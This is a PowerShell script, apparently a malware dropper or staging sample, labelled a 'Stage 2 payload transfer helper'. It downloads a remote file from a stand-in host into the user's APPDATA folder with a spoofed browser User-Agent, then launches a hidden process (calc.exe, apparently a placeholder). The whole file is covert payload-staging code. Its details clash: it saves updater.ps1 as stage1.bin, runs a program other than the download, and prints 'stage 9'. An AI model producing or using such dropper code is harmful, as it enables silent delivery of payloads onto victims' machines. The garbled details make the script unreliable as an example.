<#
.SYNOPSIS
    Stage 2 payload transfer helper.

.DESCRIPTION
    Downloads the staged artefact to a per-user drop path.
    The destination is verified before the launcher runs.
#>
$Stage2Url = "http://example.org:80/updater.ps1"
$OutputPath = "$env:APPDATA\stage1.bin"
$TimeoutSec = 60
$UserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
$ErrorActionPreference = "Stop"

function Invoke-Stage2Download {
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45,
        [string]$UserAgent = "Mozilla/5.0"
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

try {
    Write-Verbose "Starting stage 2 transfer"
    $ResultObject = Invoke-Stage2Download -SourceUrl $Stage2Url -DestinationPath $OutputPath -TimeoutSec $TimeoutSec -UserAgent $UserAgent
    if ($ResultObject) {
        Start-Process -FilePath "calc.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
    }
}
catch {
    Write-Warning "Stage 2 transfer failed: $($_.Exception.Message)"
}

$ProgressPreference = "SilentlyContinue"
Write-Output "stage 9 initialized"
